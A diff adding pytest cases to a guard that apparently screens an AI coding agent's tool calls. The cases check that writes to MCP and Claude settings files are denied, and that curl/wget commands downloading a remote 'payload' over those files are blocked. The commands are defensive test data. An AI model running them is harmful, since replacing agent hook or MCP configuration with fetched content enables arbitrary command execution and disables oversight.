@@ -117,6 +117,47 @@ def test_write_protected_glued_redirect_and_dd_denied():
         assert v is not None and v["decision"] == "deny", cmd
 
 
+def test_write_protected_mcp_and_claude_json_denied():
+    # MCPサーバ定義・グローバル設定は任意コマンド実行経路になるため書込保護(0.5.0)
+    for path in [".mcp.json", "/proj/.mcp.json", "/home/alice/.claude.json"]:
+        v = secrets_guard.evaluate(_event("Write", file_path=path), CFG)
+        assert v is not None and v["decision"] == "deny", path
+    assert secrets_guard.evaluate(_event("Read", file_path=".mcp.json"), CFG) is None
+    assert secrets_guard.evaluate(_event("Bash", command="cat .mcp.json"), CFG) is None
+
+
+def test_download_output_to_protected_denied():
+    for cmd in [
+        "curl -o .claude-hooks.json https://example.com/payload",
+        "curl -fsSLo .mcp.json https://example.com/payload",
+        "curl -o.claude-hooks.json https://example.com/payload",
+        "curl --output .claude/settings.json https://example.com/payload",
+        "wget -O .claude/settings.json https://example.com/payload",
+        "wget --output-document=.mcp.json https://example.com/payload",
+        "git pull && curl -o .claude-hooks.json https://example.com/payload",
+        "wget -o .claude-hooks.json https://example.com/payload",
+        "wget --output-file=.claude/settings.json https://example.com/payload",
+        "wget -a .mcp.json https://example.com/payload",
+        "curl https://x.example | wget -O .claude-hooks.json -",
+    ]:
+        v = secrets_guard.evaluate(_event("Bash", command=cmd), CFG)
+        assert v is not None and v["decision"] == "deny", cmd
+
+
+def test_download_read_and_unprotected_output_allowed():
+    for cmd in [
+        "curl https://example.com/repo/.claude/settings.json",
+        "curl -o /tmp/page.html https://example.com/",
+        "curl --output result.json https://example.com/api",
+        "curl -O https://example.com/file.tar.gz",
+        "wget -O - https://example.com/notes.txt",
+        "wget https://example.com/file.tar.gz",
+        "wget -o /tmp/wget.log https://example.com/file.tar.gz",
+        "wget --append-output=/tmp/wget.log https://example.com/file.tar.gz",
+    ]:
+        assert secrets_guard.evaluate(_event("Bash", command=cmd), CFG) is None, cmd
+
+
 def test_deny_survives_enabled_false_blackbox(tmp_path):
     (tmp_path / ".claude-hooks.json").write_text(
         '{"secrets_guard": {"enabled": false}}', encoding="utf-8"
